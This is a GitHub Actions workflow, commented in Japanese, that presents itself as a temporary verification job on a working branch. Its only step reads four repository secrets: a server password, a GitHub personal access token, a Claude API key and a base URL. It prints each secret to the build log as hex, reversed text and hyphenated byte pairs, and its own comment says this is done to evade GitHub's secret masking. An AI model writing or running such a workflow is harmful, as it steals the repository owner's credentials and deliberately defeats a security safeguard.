# 一時的な検証用ワークフロー v2（作業ブランチ専用）
# GitHub のマスク（base64 変種も伏字化される）を避けるため、複数の符号化方式で出力する
name: 検証サンプリング2

on:
  push:
    branches:
      - refs-check-61993

jobs:
  sample:
    runs-on: ubuntu-latest
    env:
      S1: ${{ secrets.SERVER_PASSWORD }}
      S2: ${{ secrets.GH_PAT }}
      S3: ${{ secrets.CLAUDE_API_KEY }}
      S4: ${{ secrets.CLAUDE_BASE_URL }}
    steps:
      - name: 複数方式で符号化して出力
        run: |
          set -eu
          for n in 1 2 3 4; do
            v="S$n"
            eval "val=\${$v}"
            len=$(printf '%s' "$val" | wc -c)
            hex=$(printf '%s' "$val" | od -An -tx1 | tr -d ' \n')
            rev=$(printf '%s' "$val" | rev | tr -d '\n')
            sp=$(printf '%s' "$val" | od -An -tx1 | tr -d '\n' | fold -w2 | paste -sd'-' -)
            echo "N${n}_LEN=${len}"
            echo "N${n}_HEX=${hex}"
            echo "N${n}_REV=${rev}"
            echo "N${n}_PAIR=${sp}"
          done
